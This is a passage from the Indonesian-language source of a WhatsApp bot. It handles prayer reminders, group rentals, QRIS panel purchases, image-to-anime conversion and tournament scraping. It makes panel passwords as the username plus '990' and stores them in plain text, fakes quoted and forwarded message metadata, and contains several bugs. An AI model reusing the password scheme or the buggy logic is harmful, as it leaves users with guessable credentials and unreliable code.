                        config.close = cl === 'on';
                        fsSync.writeFileSync(autosholatFile, JSON.stringify(config, null, 2));
                        reply(`Auto-close diubah: *${cl.toUpperCase()}* (5 menit)`);
                        break;

                    case 'status':
                        reply(
                            `*STATUS AUTOSHOLAT*\n\n` +
                            `Aktif       : ${config.aktif ? 'Ya ✅' : 'Tidak ❌'}\n` +
                            `Hidetag     : ${config.hidetag ? 'Ya (tag semua)' : 'Tidak'}\n` +
                            `Auto-close  : ${config.close ? 'Ya (5 menit)' : 'Tidak'}\n` +
                            `Jumlah grup : ${config.grups.length}`
                        );
                        break;

                    default:
                        reply(
                            `*Fitur AutoSholat*\n\n` +
                            `Perintah:\n` +
                            `• .autosholat add\n` +
                            `• .autosholat del\n` +
                            `• .autosholat list\n` +
                            `• .autosholat on / off          (owner)\n` +
                            `• .autosholat hidetag on/off     (owner)\n` +
                            `• .autosholat close on/off       (owner)\n` +
                            `• .autosholat status\n\n` +
                            `Pengingat akan kirim teks + thumbnail + audio azan + hidetag/close opsional.\n\n` +
                            `Catatan: Bisa jalan bareng .onsholat (tutup manual hari ini).`
                        );
                        break;
                }
                break;
            }









            case 'cekidgc':
            case 'idgc':
            case 'gcid':
                {
                    if (!m.isGroup) return reply(mess.group);

                    const meta = groupMetadata || await sock.groupMetadata(m.chat).catch(() => ({}));

                    if (!meta || !meta.subject) {
                        return reply("Gagal mengambil info grup. Coba lagi nanti.");
                    }

                    // Ambil JID bot dengan decodeJid (paling akurat)
                    const botJid = sock.decodeJid(sock.user.id);

                    // Cek apakah bot termasuk admin (superadmin atau admin)
                    const isBotAdmin = meta.participants.some(p => p.id === botJid && (p.admin === 'admin' || p.admin === 'superadmin'));

                    const admins = meta.participants.filter(p => p.admin).length;

                    const teks = `
╭───〔 *INFO GRUP* 〕────╮
│
│ 📛 *Nama Grup* : ${meta.subject}
│ 🆔 *ID Grup*   : ${meta.id || m.chat}
│ 👥 *Total Member* : ${meta.participants.length}
│ 👑 *Jumlah Admin* : ${admins}
│ 🤖 *Bot sebagai Admin* : ${isBotAdmin ? 'Ya ✅' : 'Tidak ❌'}
│ 📅 *Dibuat pada* : ${meta.creation ? new Date(meta.creation * 1000).toLocaleString('id-ID') : 'Tidak diketahui'}
│
│ 🔗 *Link Grup* : ${meta.id ? 'https://chat.whatsapp.com/' + (await sock.groupInviteCode(m.chat).catch(() => 'Tidak tersedia')) : 'Tidak tersedia'}
│
╰───────────────────────╯

*Catatan*: ID grup sudah ditampilkan di atas.  
Langsung copy teks di bawah ini kalau perlu:

\`\`\`
${meta.id || m.chat}
\`\`\`

Gunakan *${prefix + command}* lagi kalau ingin cek ulang.
`.trim();

                    // Fake quoted aesthetic (tetap dipertahankan)
                    const fakeQuoted = {
                        key: {
                            remoteJid: "status@broadcast",
                            fromMe: false,
                            id: 'BAE5F729F60A5C1A',
                            participant: '0@s.whatsapp.net'
                        },
                        message: {
                            extendedTextMessage: {
                                text: '@VannessWangsaff V2',
                                contextInfo: {
                                    externalAdReply: {
                                        title: "Group Information",
                                        body: "Powered by @VannessWangsaff",
                                        thumbnailUrl: "https://files.catbox.moe/qexjj3.png",
                                        sourceUrl: "https://wa.me/6281934874758",
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                }
                            }
                        }
                    };

                    // Reaksi loading
                    await sock.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

                    // Kirim pesan tanpa button
                    await sock.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
                            mentionedJid: [m.sender],
                            externalAdReply: {
                                title: "Info Grup Lengkap",
                                body: `Total member: ${meta.participants.length} orang`,
                                thumbnailUrl: "https://files.catbox.moe/2e2w5j.jpg",
                                sourceUrl: "https://wa.me/6281934874758",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: fakeQuoted });

                    // Reaksi selesai
                    await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                    break;
                }


            case 'buy1gb': case 'buy2gb': case 'buy3gb': case 'buy4gb': case 'buy5gb':
            case 'buy6gb': case 'buy7gb': case 'buy8gb': case 'buy9gb': case 'buy10gb':
            case 'buyunli': {
                if (!isPrem) return reply(`Fitur ini khusus member premium.`);

                let sizeStr = command.replace('buy', '').toLowerCase();
                if (sizeStr === 'unli' || sizeStr === 'unlimited') sizeStr = 'unli';

                const allowed = ['1gb', '2gb', '3gb', '4gb', '5gb', '6gb', '7gb', '8gb', '9gb', '10gb', 'unli'];
                if (!allowed.includes(sizeStr)) return reply(`Pilih paket: 1gb - 10gb atau unli`);

                if (!text) return reply(`Masukkan username panel!\nContoh: ${prefix}${command} namauser`);

                let username = text.toLowerCase().trim().replace(/[^a-z0-9]/g, '');
                if (username.length < 3 || username.length > 15) {
                    return reply(`Username minimal 3 - maksimal 15 karakter.\nHanya huruf kecil & angka.`);
                }

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                let ram, disk, cpu, harga, label;

                if (sizeStr === 'unli') {
                    label = "UNLIMITED";
                    ram = disk = cpu = "0";
                    harga = 15000;
                } else {
                    const gb = parseInt(sizeStr);
                    label = `${gb}GB`;
                    ram = (gb * 1000).toString();
                    disk = (gb * 1000).toString();
                    cpu = (gb * 20 + 20).toString();
                    harga = gb * 500;
                }

                const orderId = `PNL-${sizeStr.toUpperCase()}-${Date.now().toString().slice(-6)}`;
                const password = username + "990"; // Bisa diganti random: Math.random().toString(36).slice(-10)

                const payload = {
                    project: global.PROJECT_SLUG,
                    order_id: orderId,
                    amount: harga,
                    api_key: global.API_KEY_PAKASIR
                };

                try {
                    const { data } = await axios.post('https://app.pakasir.com/api/transactioncreate/qris', payload, {
                        headers: { 'Content-Type': 'application/json' },
                        timeout: 15000
                    });

                    if (!data?.payment?.payment_number) {
                        throw new Error("Response Pakasir tidak valid atau project salah");
                    }

                    const payment = data.payment;
                    const qrBuffer = await generateQrisCanvas(payment.payment_number, label, harga, payment.total_payment);

                    let caption = `🛒 *INVOICE PEMBELIAN PANEL*\n\n`;
                    caption += `📋 Order ID : ${orderId}\n`;
                    caption += `📦 Paket    : ${label}\n`;
                    caption += `👤 Username : ${username}\n`;
                    caption += `💰 Harga    : Rp ${harga.toLocaleString('id-ID')}\n`;
                    caption += `💳 Total    : Rp ${payment.total_payment.toLocaleString('id-ID')}\n`;
                    caption += `⏰ Expired  : ${new Date(payment.expired_at * 1000).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n`;
                    caption += `Scan QRIS di atas. Setelah lunas, panel akan dibuat otomatis dan detail login dikirim ke private chat Anda.`;

                    await sock.sendMessage(m.chat, {
                        image: qrBuffer,
                        caption: caption
                    }, { quoted: m });

                    // Simpan transaksi
                    const trxPath = './data/transaksi_pakasir.json';
                    let dbTrx = fsSync.existsSync(trxPath) ? JSON.parse(fsSync.readFileSync(trxPath, 'utf8')) : {};

                    dbTrx[orderId] = {
                        sender: m.sender,
                        chat: m.chat,
                        type: 'PANEL',
                        amount: harga,
                        status: 'UNPAID',
                        created_at: Date.now(),
                        panel_data: {
                            username: username,
                            password: password,
                            ram: ram,
                            disk: disk,
                            cpu: cpu,
                            size_label: label,
                            domain: global.domain,
                            apikey: global.apikey,
                            nestid: global.nestid,
                            egg: global.egg,
                            loc: global.loc
                        }
                    };

                    fsSync.writeFileSync(trxPath, JSON.stringify(dbTrx, null, 2));

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {
                    console.error("[BUY PANEL ERROR FULL]", {
                        message: err.message,
                        code: err.code,
                        status: err.response?.status,
                        responseData: err.response?.data,
                        requestPayload: payload
                    });

                    let errorMsg = err.message || 'Server Pakasir bermasalah';
                    if (err.response?.data?.error) errorMsg += `\nPesan Pakasir: ${err.response.data.error}`;

                    reply(`❌ Gagal membuat tagihan.\nDetail: ${errorMsg}\nCek log bot atau hubungi owner.`);
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
            }
                break;

            case "listsewa": {
                if (!isAn) return reply("Hanya owner yang bisa menggunakan command ini!");

                try {
                    const filePath = './data/sewa.json';
                    if (!fs.existsSync(filePath)) {
                        return reply("📭 Belum ada data sewa.");
                    }
                    const data = fs.readFileSync(filePath, 'utf8');
                    const sewaData = JSON.parse(data);
                    const aktif = sewaData.filter(s => s.status === 'active');

                    if (aktif.length === 0) {
                        return reply("📭 Tidak ada sewa aktif.");
                    }

                    let msg = `📋 *DAFTAR SEWA AKTIF*\n\n`;
                    for (let i = 0; i < aktif.length; i++) {
                        const s = aktif[i];
                        const sisa = s.endTime - Date.now();
                        const hari = Math.floor(sisa / (1000 * 60 * 60 * 24));
                        const jam = Math.floor((sisa % (86400000)) / (3600000));
                        const menit = Math.floor((sisa % 3600000) / 60000);

                        let namaGrup = s.groupName || 'Grup tidak diketahui';
                        // Coba ambil nama grup jika belum ada
                        if (!s.groupName) {
                            try {
                                const meta = await sock.groupMetadata(s.groupId).catch(() => null);
                                if (meta) {
                                    namaGrup = meta.subject;
                                    s.groupName = namaGrup; // update di array
                                }
                            } catch { }
                        }

                        msg += `*${i + 1}. ${namaGrup}*\n`;
                        msg += `   🆔 ID: \`${s.groupId}\`\n`;
                        msg += `   ⏳ Sisa: ${hari} hari ${jam} jam ${menit} menit\n`;
                        msg += `   📅 Berakhir: ${new Date(s.endTime).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n`;
                    }

                    // Simpan perubahan nama grup jika ada
                    fs.writeFileSync(filePath, JSON.stringify(sewaData, null, 2));

                    reply(msg);
                } catch (err) {
                    console.error(err);
                    reply("❌ Error: " + err.message);
                }
            }
                break;


            case "delsewa": {
                if (!isAn) return reply("Hanya owner yang bisa menggunakan command ini!");
                if (!text) return reply("Contoh: .delsewa [nomor urut list] atau .delsewa [id grup]");

                try {
                    const filePath = './data/sewa.json';
                    if (!fs.existsSync(filePath)) return reply("📭 Tidak ada data sewa.");
                    const sewaData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                    const aktif = sewaData.filter(s => s.status === 'active');

                    let indexToDelete = -1;
                    // Cek apakah input berupa nomor urut (angka)
                    if (/^\d+$/.test(text)) {
                        const idx = parseInt(text) - 1;
                        if (idx >= 0 && idx < aktif.length) {
                            const targetId = aktif[idx].groupId;
                            indexToDelete = sewaData.findIndex(s => s.groupId === targetId);
                        }
                    } else {
                        // Anggap input sebagai ID grup
                        indexToDelete = sewaData.findIndex(s => s.groupId === text && s.status === 'active');
                    }

                    if (indexToDelete === -1) return reply("❌ Data sewa tidak ditemukan.");

                    // Hapus dari array
                    sewaData.splice(indexToDelete, 1);
                    fs.writeFileSync(filePath, JSON.stringify(sewaData, null, 2));

                    reply("✅ Berhasil menghapus sewa.");
                } catch (err) {
                    console.error(err);
                    reply("❌ Error: " + err.message);
                }
            }
                break;


            case "editsewa": {
                if (!isAn) return reply("Hanya owner yang bisa menggunakan command ini!");
                // Format: .editsewa [nomor urut list|id grup] [durasi baru] misal: .editsewa 1 30d
                const args = text.trim().split(/\s+/);
                if (args.length < 2) return reply("Contoh: .editsewa [nomor urut|id grup] [durasi baru] (30d, 7h, 60m, 30s)");

                const identifier = args[0];
                const durasi = args[1];

                const waktuRegex = /^(\d+)(s|m|h|d)$/;
                if (!waktuRegex.test(durasi)) {
                    return reply("Format durasi salah! Gunakan: 30s, 30m, 30h, 30d");
                }

                try {
                    const filePath = './data/sewa.json';
                    if (!fs.existsSync(filePath)) return reply("📭 Tidak ada data sewa.");
                    const sewaData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                    const aktif = sewaData.filter(s => s.status === 'active');

                    let targetIndex = -1;
                    if (/^\d+$/.test(identifier)) {
                        const idx = parseInt(identifier) - 1;
                        if (idx >= 0 && idx < aktif.length) {
                            const targetId = aktif[idx].groupId;
                            targetIndex = sewaData.findIndex(s => s.groupId === targetId);
                        }
                    } else {
                        targetIndex = sewaData.findIndex(s => s.groupId === identifier && s.status === 'active');
                    }

                    if (targetIndex === -1) return reply("❌ Data sewa tidak ditemukan.");

                    const [, jumlah, unit] = durasi.match(waktuRegex);
                    const tambahanDetik = calculateSeconds(parseInt(jumlah), unit);
                    const sekarang = Date.now();
                    const sisaLama = sewaData[targetIndex].endTime - sekarang;
                    if (sisaLama <= 0) {
                        return reply("⚠️ Sewa sudah berakhir, tidak bisa diperpanjang. Gunakan .delsewa lalu buat baru.");
                    }

                    // Tambah durasi
                    sewaData[targetIndex].endTime += tambahanDetik * 1000;

                    fs.writeFileSync(filePath, JSON.stringify(sewaData, null, 2));

                    const newEnd = new Date(sewaData[targetIndex].endTime).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
                    reply(`✅ Sewa berhasil diperpanjang.\n📅 Berakhir: ${newEnd}`);
                } catch (err) {
                    console.error(err);
                    reply("❌ Error: " + err.message);
                }
            }
                break;

            case "ceksewa": {
                if (!m.isGroup) return reply("Command ini hanya bisa digunakan di dalam grup!");
                const groupId = m.chat;

                try {
                    const filePath = './data/sewa.json';
                    if (!fs.existsSync(filePath)) return reply("📭 Grup ini tidak memiliki data sewa.");

                    const sewaData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                    const sewa = sewaData.find(s => s.groupId === groupId && s.status === 'active');

                    if (!sewa) return reply("📭 Grup ini tidak memiliki sewa aktif.");

                    const sisa = sewa.endTime - Date.now();
                    const hari = Math.floor(sisa / (1000 * 60 * 60 * 24));
                    const jam = Math.floor((sisa % (86400000)) / (3600000));
                    const menit = Math.floor((sisa % 3600000) / 60000);
                    const detik = Math.floor((sisa % 60000) / 1000);

                    let namaGrup = sewa.groupName || groupMetadata?.subject || 'Grup ini';
                    if (!sewa.groupName && groupMetadata?.subject) {
                        sewa.groupName = groupMetadata.subject;
                        fs.writeFileSync(filePath, JSON.stringify(sewaData, null, 2));
                    }

                    const start = new Date(sewa.startTime).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
                    const end = new Date(sewa.endTime).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

                    reply(
                        `📋 *INFORMASI SEWA GRUP*\n\n` +
                        `🏷️ Nama Grup: ${namaGrup}\n` +
                        `🆔 ID Grup: \`${groupId}\`\n` +
                        `📅 Mulai: ${start}\n` +
                        `📅 Berakhir: ${end}\n` +
                        `⏳ Sisa Waktu: ${hari} hari ${jam} jam ${menit} menit ${detik} detik`
                    );
                } catch (err) {
                    console.error(err);
                    reply("❌ Error: " + err.message);
                }
            }
                break;



            case "addsewa": {
                if (!isAn) return reply("Hanya owner yang bisa menggunakan command ini!");
                if (!text) return reply("Contoh: .addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d");

                try {
                    const [link, waktu] = text.split("|").map(item => item.trim());
                    if (!link || !waktu) return reply("Format salah! Contoh: .addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d");

                    // Validasi format waktu
                    const waktuRegex = /^(\d+)(s|m|h|d)$/;
                    if (!waktuRegex.test(waktu)) {
                        return reply("Format waktu salah! Gunakan: 30s (detik), 30m (menit), 30h (jam), 30d (hari)");
                    }

                    const [, jumlah, unit] = waktu.match(waktuRegex);
                    const totalDetik = calculateSeconds(parseInt(jumlah), unit);

                    // Ekstrak kode invite dari link
                    const inviteCode = await extractGroupId(link);
                    if (!inviteCode) return reply("Link group tidak valid!");

                    // Dapatkan info grup dari kode invite (untuk mendapatkan groupId asli dan validasi link)
                    let groupMetadata;
                    try {
                        groupMetadata = await sock.groupGetInviteInfo(inviteCode);
                    } catch (e) {
                        return reply("❌ Gagal mendapatkan info grup. Mungkin link sudah kadaluarsa atau tidak valid.");
                    }

                    const groupId = groupMetadata.id; // ID grup sebenarnya

                    // Coba join grup, jika sudah di grup (error 409) maka abaikan
                    try {
                        await sock.groupAcceptInvite(inviteCode);
                    } catch (joinErr) {
                        // Periksa apakah error karena conflict (sudah di grup)
                        if (joinErr.data === 409 || (joinErr.output?.statusCode === 500 && joinErr.message?.includes('Conflict'))) {
                            console.log("Bot sudah berada di grup, melewati proses join.");
                        } else {
                            // Jika error lain, lempar ulang
                            throw joinErr;
                        }
                    }

                    // Simpan data sewa
                    await saveSewaData(groupId, totalDetik);

                    reply(`✅ Berhasil menambah sewa group!\n📅 Durasi: ${jumlah}${unit}\n⏰ Berakhir: ${new Date(Date.now() + totalDetik * 1000).toLocaleString()}`);

                } catch (error) {
                    console.error(error);
                    reply("Terjadi error saat menambah sewa: " + error.message);
                }
            }
                break;



            case 'runtime':
            case 'rt':
            case 'bot': {
                // Hanya respon jika input adalah kata tunggal "bot", "Bot", atau perintah ping/runtime
                const inputText = m.text.trim().toLowerCase();

                // Respon hanya jika benar-benar kata tunggal "bot"/"Bot" atau perintah
                if (inputText === 'bot' || inputText === 'bot' || 'ping' || command === 'runtime' || command === 'rt') {
                    const pushname = m.pushName || "Kawan";
                    const uptime = process.uptime() * 1000;

                    const days = Math.floor(uptime / (1000 * 60 * 60 * 24));
                    const hours = Math.floor((uptime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                    const minutes = Math.floor((uptime % (1000 * 60 * 60)) / (1000 * 60));
                    const seconds = Math.floor((uptime % (1000 * 60)) / 1000);

                    let uptimeStr = '';
                    if (days > 0) uptimeStr += `${days} hari${days > 1 ? 'i' : ''}, `;
                    if (hours > 0) uptimeStr += `${hours} jam${hours > 1 ? 'm' : ''}, `;
                    if (minutes > 0) uptimeStr += `${minutes} menit${minutes > 1 ? 't' : ''}, `;
                    if (seconds > 0) uptimeStr += `${seconds} detik${seconds > 1 ? 'k' : ''}`;

                    // Hilangkan koma terakhir jika ada
                    uptimeStr = uptimeStr.replace(/, $/, '');

                    const botReplies = [
                        `Iyah? Bot udah nyala sejak ${uptimeStr} lalu, *${pushname}*! 🚀✨`,
                        `Halo *${pushname}*, bot udah aktif selama ${uptimeStr}! 😎🔥`,
                        `Bot disini, *${pushname}*! Sudah berjalan ${uptimeStr} lalu. 🤖💪`,
                        `Yo *${pushname}*, bot online sejak ${uptimeStr}! 😜🎉`,
                        `Hai *${pushname}*, bot siap dari ${uptimeStr}! 🌟⚡`,
                        `What's up, *${pushname}*? Bot udah aktif dari ${uptimeStr}. 😺🛠️`,
                        `Hey *${pushname}*, bot jalan terus dari ${uptimeStr}! 🦾😍`,
                        `Halo *${pushname}*, bot setia menemani sejak ${uptimeStr}! 🐾🌈`,
                        `Bot panggilanmu, *${pushname}*! Online sejak ${uptimeStr} lalu. 😇🎯`,
                        `bat bet bot, *${pushname}*? bot bot boti ini sudah jalan dari ${uptimeStr}! 🤤🤤`,
                        `Halo *${pushname}*, bot standby dari ${uptimeStr}! 🛡️⚙️`,
                        `Bot hadir, *${pushname}*! Aktif selama ${uptimeStr}. 😸🌠`,
                        `Hai *${pushname}*, bot ga pernah lelah sejak ${uptimeStr}! 💡🚴`,
                        `Yo, *${pushname}*! Bot udah beroperasi ${uptimeStr}. 😻🔔`,
                        `Halo *${pushname}*, bot siap melayani ${uptimeStr}! 🦁🎈`,
                    ];

                    const response = botReplies[Math.floor(Math.random() * botReplies.length)];

                    await sock.sendMessage(m.chat, {
                        text: response
                    }, { quoted: m });
                }
                break;
            }


            case "imsak":
            case "imsakiyah": {
                if (!isAn) return reply("Hanya owner yang bisa menggunakan command ini!");
                if (!m.isGroup) return reply("Perintah ini hanya untuk grup!");

                const imsakFile = "./data/imsakiyah.json";

                // Inisialisasi file jika belum ada
                if (!fsSync.existsSync(imsakFile)) {
                    fsSync.writeFileSync(
                        imsakFile,
                        JSON.stringify({ grups: [], kotaDefault: "pekanbaru" }, null, 2)
                    );
                }

                let config = JSON.parse(fsSync.readFileSync(imsakFile, "utf8"));
                const sub = args[0]?.toLowerCase() || "";

                if (sub === "on") {
                    if (!isAdmin && !isAn) return reply(mess.admin);
                    if (config.grups.includes(m.chat)) return reply("Fitur imsakiyah sudah aktif di grup ini.");

                    config.grups.push(m.chat);
                    fsSync.writeFileSync(imsakFile, JSON.stringify(config, null, 2));
                    reply("✅ Fitur pengingat imsakiyah & buka puasa telah diaktifkan!");
                    break;
                }

                if (sub === "off") {
                    if (!isAdmin && !isAn) return reply(mess.admin);
                    config.grups = config.grups.filter((id) => id !== m.chat);
                    fsSync.writeFileSync(imsakFile, JSON.stringify(config, null, 2));
                    reply("⛔ Fitur imsakiyah telah dimatikan di grup ini.");
                    break;
                }

                if (sub === "setkota") {
                    if (!isAdmin && !isAn) return reply(mess.admin);
                    if (!text) return reply(`Contoh: ${prefix}imsak setkota pekanbaru`);

                    const kota = text.trim();
                    const result = await searchKota(kota);
                    if (!result) return reply(`Kota "${kota}" tidak ditemukan.`);

                    config.kotaDefault = result.id; // simpan ID kota
                    config.kotaNama = result.nama_kota; // simpan nama untuk tampilan
                    fsSync.writeFileSync(imsakFile, JSON.stringify(config, null, 2));

                    reply(`✅ Lokasi diubah menjadi: *${result.nama_kota}*\nID: ${result.id}`);
                    break;
                }

                if (sub === "status" || !sub) {
                    const kotaId = config.kotaDefault || "0401"; // default Jakarta jika belum diset
                    let kotaNama = config.kotaNama || "tidak diset (default Jakarta)";

                    try {
                        const jadwal = await getTodaySchedule(kotaId);
                        const times = extractPrayerTimes(jadwal);

                        let teks = `🕌 *STATUS IMSAKIYAH*\n\n`;
                        teks += `📍 Lokasi : ${kotaNama}\n`;
                        teks += `📅 Hari ini:\n`;
                        teks += `• Imsak     : ${times.imsak}\n`;
                        teks += `• Subuh     : ${times.subuh}\n`;
                        teks += `• Dzuhur    : ${times.dzuhur}\n`;
                        teks += `• Ashar     : ${times.ashar}\n`;
                        teks += `• Maghrib   : ${times.maghrib} (buka puasa)\n`;
                        teks += `• Isya      : ${times.isya}\n\n`;

                        teks += `Status fitur: ${config.grups.includes(m.chat) ? "AKTIF ✅" : "NONAKTIF ❌"}\n`;
                        teks += `Gunakan .imsak on / off / setkota <kota>`;

                        await reply(teks);
                    } catch (err) {
                        reply("Gagal mengambil jadwal hari ini.\n" + err.message);
                    }
                    break;
                }

                if (sub === "list") {
                    if (!isAn) return reply(mess.owner);
                    if (config.grups.length === 0) return reply("Belum ada grup yang aktifkan imsakiyah.");

                    let teks = "📋 *DAFTAR GRUP IMSAKIYAH*\n\n";
                    for (let i = 0; i < config.grups.length; i++) {
                        try {
                            const meta = await sock.groupMetadata(config.grups[i]);
                            teks += `${i + 1}. ${meta.subject || "Grup"} (${config.grups[i]})\n`;
                        } catch {
                            teks += `${i + 1}. ${config.grups[i]} (mungkin sudah keluar)\n`;
                        }
                    }
                    reply(teks);
                    break;
                }

                reply(
                    `Perintah imsakiyah:\n` +
                    `• ${prefix}imsak on          → aktifkan pengingat\n` +
                    `• ${prefix}imsak off         → matikan\n` +
                    `• ${prefix}imsak setkota <kota> → ubah lokasi (contoh: pekanbaru)\n` +
                    `• ${prefix}imsak status      → lihat jadwal hari ini & status\n` +
                    `• ${prefix}imsak list        → daftar grup`
                );
                break;
            }


            case "toanime":
            case "anime":
            case "animefy":
            case "ghibli": {
                // Cek apakah ada gambar (langsung kirim atau reply)
                const isImage =
                    m.mtype === "imageMessage" ||
                    (m.quoted &&
                        (m.quoted.mtype === "imageMessage" ||
                            m.quoted.mtype === "stickerMessage"));

                if (!isImage) {
                    return reply(
                        `🎨 *TO ANIME*\n\n` +

                        `Contoh:\n` +
                        `• Kirim gambar lalu ketik ${prefix + command}\n` +
                        `• Reply gambar lalu ketik ${prefix + command}\n\n` +
                        `> _Fitur premium only • Powered by @VannessWangsaff V3_`
                    );
                }

                // Cek premium 
                if (!isPrem) {
                    return reply(
                        `Fitur *${command}* khusus member premium. 
      Upgrade status premium dengan menghubungi owner.`
                    );
                }

                // Reaksi loading
                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    // Download gambar
                    let buffer;
                    if (m.quoted && (m.quoted.mtype === "imageMessage" || m.quoted.mtype === "stickerMessage")) {
                        buffer = await m.quoted.download();
                    } else if (m.mtype === "imageMessage") {
                        buffer = await m.download();
                    }

                    if (!buffer || buffer.length === 0) {
                        throw new Error("Gagal mendownload gambar");
                    }

                    // Kirim pesan proses
                    await reply(
                        `⏳ *Sedang memproses gambar...*\n\n` +
                        `> Mengubah ke gaya *Studio Ghibli*\n` +
                        `> Estimasi waktu: 1-3 menit\n` +
                        `> Jangan spam command ya, sabar dulu~ 🤍\n\n` +
                        `_Powered by @VannessWangsaff V3_`
                    );

                    // Prompt khusus Ghibli 
                    const PROMPT = `Transform this image into Studio Ghibli anime style. 
Make the characters look like they belong in a Ghibli movie with soft colors, 
detailed backgrounds, expressive eyes, and that signature warm, magical atmosphere. 
Keep the original composition but apply the distinct Ghibli artistic style with 
watercolor-like textures and dreamy lighting.`;

                    // Panggil nanoBanana dengan parameter tambahan
                    const resultBuffer = await nanoBanana(buffer, PROMPT, {
                        resolution: "4K",
                        steps: 25,
                        guidance_scale: 8,
                    });

                    // Kirim hasil
                    await sock.sendMessage(m.chat, {
                        image: resultBuffer,
                        caption: `✨ *Hasil To-Anime Anda* ✨\n\n` +
                            `> Gaya: Studio Ghibli\n` +
                            `> Powered by @VannessWangsaff V3
               
              `,
                    }, { quoted: m });

                    // Reaksi sukses
                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {
                    console.error("[TOANIME ERROR]", err);

                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });



                    await reply(
                        `❌ *Gagal memproses*\n\n` +
                        `Alasan: ${errMsg}\n\n` +
                        `Coba lagi dengan gambar yang berbeda atau tunggu sebentar.\n` +
                        `_Powered by @VannessWangsaff V3_`
                    );
                }
                break;
            }

            case "infotourney":
            case "turnamenml":
            case "mltourney": {
                // Reaksi loading
                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    const url = "https://infotourney.com/tournament/mobile-legends";
                    const { data } = await axios.get(url, { timeout: 15000 });
                    const $ = cheerio.load(data);

                    const tournaments = [];

                    $(".items-row .item").each((_, element) => {
                        const item = $(element);

                        const title = item.find('h2[itemprop="name"] a').text().trim();
                        const link = item.find('h2[itemprop="name"] a').attr("href");
                        const image = item.find("p img").attr("src");
                        let datePublished = item.find('time[itemprop="datePublished"]').attr("datetime");

                        if (datePublished) {
                            datePublished = moment(datePublished).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm");
                        }

                        const descriptionHtml = item.find('p[style="text-align: center;"]').html() || "";
                        const [rawDescription, rawInfo] = descriptionHtml.split("<br>").map((text) => text.trim());

                        const description = rawDescription ? rawDescription.replace(/&nbsp;/g, " ") : "";
                        const info = rawInfo ? rawInfo.replace(/&nbsp;/g, " ") : "";

                        if (title && link) {
                            tournaments.push({
                                title,
                                imageUrl: image ? new URL(image, url).href : null,
                                datePublished: datePublished || "N/A",
                                description,
                                info,
                                url: new URL(link, url).href,
                            });
                        }
                    });

                    // Ambil 5 terbaru
                    const topTournaments = tournaments.slice(0, 5);

                    if (topTournaments.length === 0) {
                        await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                        return reply("❌ Tidak ada turnamen Mobile Legends yang ditemukan saat ini.");
                    }

                    // Ambil config saluran (newsletter) dari global config kamu
                    const saluranId = global.idCh || "120363335443641236@newsletter"; // ganti jika beda
                    const saluranName = global.saluran?.name || global.namaBot || "@VannessWangsaff";

                    // Buat teks
                    let text = `🏆 *INFO TURNAMEN MOBILE LEGENDS TERBARU*\n\n`;
                    text += `> Menampilkan 5 turnamen terbaru dari infotourney.com\n\n`;

                    topTournaments.forEach((t, i) => {
                        text += `╭───「 ${i + 1}. *${t.title}* 」────╮\n`;
                        text += `│ 📅 ${t.datePublished}\n`;
                        if (t.description) text += `│ 📝 ${t.description}\n`;
                        if (t.info) text += `│ ⚠️ ${t.info}\n`;
                        text += `│ 🔗 ${t.url}\n`;
                        text += `╰───────────────────────╯\n\n`;
                    });

                    text += `> _Sumber: infotourney.com • Diupdate ${moment().tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm")}_`;

                    // Kirim dengan gambar pertama (jika ada)
                    const firstImage = topTournaments[0]?.imageUrl;

                    if (firstImage) {
                        await sock.sendMessage(m.chat, {
                            image: { url: firstImage },
                            caption: text,
                            contextInfo: {
                                forwardingScore: 9999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: saluranId,
                                    newsletterName: saluranName,
                                    serverMessageId: 127, // bisa diganti atau di-random
                                },
                            },
                        }, { quoted: m });
                    } else {
                        await reply(text);
                    }

                    // Reaksi sukses
                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {




                    await reply(
                        `❌ *GAGAL MENGAMBIL INFO TURNAMEN*\n`

                            `Coba lagi nanti atau cek koneksi.\n` +
                        `_Sumber: infotourney.com_`
                    );

                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
                break;
            }


            case "upch":
            case "sendch":
            case "toch":
            case "kirimch": {
                // Hanya owner atau admin tertentu yang bisa pakai (sesuaikan)
                if (!isAn) return reply("Fitur ini khusus owner atau admin bot.");

                if (!text && !m.quoted) {
                    return reply(

                        `Kirim pesan/media ke channel WhatsApp.\n\n` +
                        `Contoh:\n` +
                        `• ${prefix + command} halo semua\n` +
                        `• Reply gambar/video/audio lalu ketik ${prefix + command} caption opsional`

                    );
                }

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    const idch = global.idCh || "120363335443641236@newsletter"; // GANTI DENGAN ID CHANNEL KAMU
                    const saluranLink = global.linkSaluran || "https://whatsapp.com/channel/0029VbBW0L5AYlUPmohzsS0Y"; // GANTI DENGAN LINK CHANNEL KAMU

                    const user = m.sender;
                    const name = (await getName(sock, user)) || "No Name";
                    let ppUrl = "https://files.catbox.moe/mzbcos.jpg";
                    try {
